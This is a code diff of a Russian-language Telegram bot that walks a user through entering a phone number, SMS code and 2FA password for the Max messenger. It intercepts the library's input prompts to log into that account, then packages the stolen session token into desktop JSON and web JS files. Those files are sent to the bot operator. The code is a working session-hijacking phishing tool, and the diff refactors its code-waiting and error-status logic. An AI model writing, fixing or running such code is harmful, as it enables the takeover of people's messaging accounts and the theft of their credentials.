@@ -5,7 +5,6 @@ import uuid
 import logging
 import time
 import threading
-from pathlib import Path
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -24,9 +23,8 @@ class AuthState(StatesGroup):
     waiting_for_password = State()
 
 pending = {}
-code_events = {}
-password_events = {}
-results = {}
+code_queue = {}
+password_queue = {}
 
 def gen_password():
     import random, string
@@ -79,36 +77,43 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
 def pymax_thread(uid, phone, work_dir):
-    from pymax import Client as MaxClient
+    from pymax import Client
     import builtins
     
     original = builtins.input
     
-    def custom_input(prompt=""):
+    def fake_input(prompt=""):
         p = prompt.lower() if prompt else ""
         if "code" in p or "код" in p:
-            code_events[uid] = threading.Event()
-            code_events[uid].wait()
-            return results.pop(f"{uid}_code")
-        elif "password" in p or "пароль" in p:
-            password_events[uid] = threading.Event()
-            password_events[uid].wait()
-            return results.pop(f"{uid}_password")
+            while uid not in code_queue:
+                time.sleep(0.3)
+            return code_queue.pop(uid)
+        if "password" in p or "пароль" in p:
+            while uid not in password_queue:
+                time.sleep(0.3)
+            return password_queue.pop(uid)
         return original(prompt)
     
-    builtins.input = custom_input
+    builtins.input = fake_input
     
     try:
-        client = MaxClient(phone=phone, work_dir=work_dir)
+        client = Client(phone=phone, work_dir=work_dir)
         client.start()
-        
-        token = client.token if hasattr(client, 'token') else client.session.token
-        user_id = client.my_id if hasattr(client, 'my_id') else client.me.id
-        
-        results[uid] = {"ok": True, "token": token, "user_id": user_id}
-        
+        pending[uid]["token"] = client.token
+        pending[uid]["user_id"] = client.my_id
+        pending[uid]["status"] = "done"
     except Exception as e:
-        results[uid] = {"ok": False, "error": str(e)}
+        msg = str(e).lower()
+        if "block" in msg:
+            pending[uid]["status"] = "blocked"
+        elif "flood" in msg or "limit" in msg:
+            pending[uid]["status"] = "flood"
+        elif "password" in msg or "2fa" in msg:
+            pending[uid]["status"] = "need_password"
+        elif "invalid" in msg or "wrong" in msg:
+            pending[uid]["status"] = "invalid"
+        else:
+            pending[uid]["status"] = f"error:{e}"
     finally:
         builtins.input = original
 
@@ -123,46 +128,38 @@ async def phone_handler(message: types.Message, state: FSMContext):
     work_dir = f"cache/{uid}"
     os.makedirs(work_dir, exist_ok=True)
     
-    # Очищаем старую сессию
-    db = Path(work_dir) / "session.db"
-    if db.exists():
-        db.unlink()
-    
-    pending[uid] = {"phone": phone, "work_dir": work_dir}
+    pending[uid] = {"phone": phone, "work_dir": work_dir, "status": "connecting"}
     await state.set_state(AuthState.waiting_for_code)
-    await state.update_data(phone=phone, work_dir=work_dir, uid=uid)
+    await state.update_data(phone=phone, work_dir=work_dir)
     
-    msg = await message.answer("⏳ Отправляю SMS...")
+    msg = await message.answer("⏳ Запрашиваю SMS...")
     
     t = threading.Thread(target=pymax_thread, args=(uid, phone, work_dir), daemon=True)
     t.start()
     
-    # Ждём пока pymax запросит код
     for _ in range(60):
         await asyncio.sleep(0.5)
-        if uid in code_events:
-            await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
+        status = pending[uid].get("status", "connecting")
+        
+        if status == "connecting":
+            continue
+        elif status == "blocked":
+            await msg.edit_text("🚫 Аккаунт заблокирован.")
+            del pending[uid]
+            await state.clear()
             return
-        if uid in results:
-            result = results.pop(uid)
-            if result["ok"]:
-                # Успех (маловероятно на этом этапе)
-                pass
-            else:
-                error = result["error"].lower()
-                if "block" in error:
-                    await msg.edit_text("🚫 Аккаунт заблокирован.")
-                elif "flood" in error or "limit" in error:
-                    await msg.edit_text("⏳ Слишком много попыток.")
-                else:
-                    await msg.edit_text(f"❌ {result['error']}")
+        elif status == "flood":
+            await msg.edit_text("⏳ Слишком много попыток.")
+            del pending[uid]
+            await state.clear()
+            return
+        elif status and status.startswith("error:"):
+            await msg.edit_text(f"❌ {status[6:]}")
             del pending[uid]
             await state.clear()
             return
     
-    await msg.edit_text("❌ Таймаут.")
-    del pending[uid]
-    await state.clear()
+    await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
@@ -176,42 +173,41 @@ async def code_handler(message: types.Message, state: FSMContext):
     phone = data["phone"]
     work_dir = data["work_dir"]
     
-    results[f"{uid}_code"] = code
-    
-    if uid in code_events:
-        code_events[uid].set()
-        del code_events[uid]
+    code_queue[uid] = code
     
     msg = await message.answer("⏳ Проверяю код...")
     
-    # Ждём результат
     for _ in range(60):
         await asyncio.sleep(0.5)
-        if uid in results:
-            result = results.pop(uid)
-            if result["ok"]:
-                token = result["token"]
-                viewer_id = result["user_id"]
-                password = gen_password()
-                session_id = int(time.time() * 1000)
-                device_id = str(uuid.uuid4())
-                
-                desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-                js = generate_web_js(password, device_id, token, viewer_id)
-                
-                await send_files(phone, uid, work_dir, desktop, js)
-                await msg.edit_text("✅ Готово!")
-            else:
-                error = result["error"].lower()
-                if "invalid" in error or "wrong" in error:
-                    await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
-                elif "password" in error or "2fa" in error:
-                    await state.set_state(AuthState.waiting_for_password)
-                    await msg.edit_text("🔐 Введи пароль 2FA:")
-                elif "block" in error:
-                    await msg.edit_text("🚫 Аккаунт заблокирован.")
-                else:
-                    await msg.edit_text(f"❌ {result['error']}")
+        status = pending[uid].get("status", "")
+        
+        if status == "done":
+            token = pending[uid]["token"]
+            viewer_id = pending[uid]["user_id"]
+            password = gen_password()
+            session_id = int(time.time() * 1000)
+            device_id = str(uuid.uuid4())
+            
+            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
+            js = generate_web_js(password, device_id, token, viewer_id)
+            
+            await send_files(phone, uid, work_dir, desktop, js)
+            await msg.edit_text("✅ Готово!")
+            del pending[uid]
+            await state.clear()
+            return
+        
+        elif status == "need_password":
+            await state.set_state(AuthState.waiting_for_password)
+            await msg.edit_text("🔐 Введи пароль 2FA:")
+            return
+        
+        elif status == "invalid":
+            await msg.edit_text("❌ Неверный код.")
+            return
+        
+        elif status == "blocked":
+            await msg.edit_text("🚫 Аккаунт заблокирован.")
             del pending[uid]
             await state.clear()
             return
@@ -232,40 +228,32 @@ async def password_handler(message: types.Message, state: FSMContext):
     phone = data["phone"]
     work_dir = data["work_dir"]
     
-    results[f"{uid}_password"] = pwd
-    
-    if uid in password_events:
-        password_events[uid].set()
-        del password_events[uid]
+    password_queue[uid] = pwd
     
     msg = await message.answer("⏳ Проверяю пароль...")
     
     for _ in range(60):
         await asyncio.sleep(0.5)
-        if uid in results:
-            result = results.pop(uid)
-            if result["ok"]:
-                token = result["token"]
-                viewer_id = result["user_id"]
-                password = gen_password()
-                session_id = int(time.time() * 1000)
-                device_id = str(uuid.uuid4())
-                
-                desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-                js = generate_web_js(password, device_id, token, viewer_id)
-                
-                await send_files(phone, uid, work_dir, desktop, js)
-                await msg.edit_text("✅ Готово!")
-            else:
-                error = result["error"].lower()
-                if "invalid" in error or "wrong" in error:
-                    await msg.edit_text("❌ Неверный пароль.")
-                elif "block" in error:
-                    await msg.edit_text("🚫 Аккаунт заблокирован.")
-                else:
-                    await msg.edit_text(f"❌ {result['error']}")
+        status = pending[uid].get("status", "")
+        
+        if status == "done":
+            token = pending[uid]["token"]
+            viewer_id = pending[uid]["user_id"]
+            password = gen_password()
+            session_id = int(time.time() * 1000)
+            device_id = str(uuid.uuid4())
+            
+            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
+            js = generate_web_js(password, device_id, token, viewer_id)
+            
+            await send_files(phone, uid, work_dir, desktop, js)
+            await msg.edit_text("✅ Готово!")
             del pending[uid]
             await state.clear()
+            return
+        
+        elif status == "invalid":
+            await msg.edit_text("❌ Неверный пароль.")
             return
     
     await msg.edit_text("❌ Таймаут.")
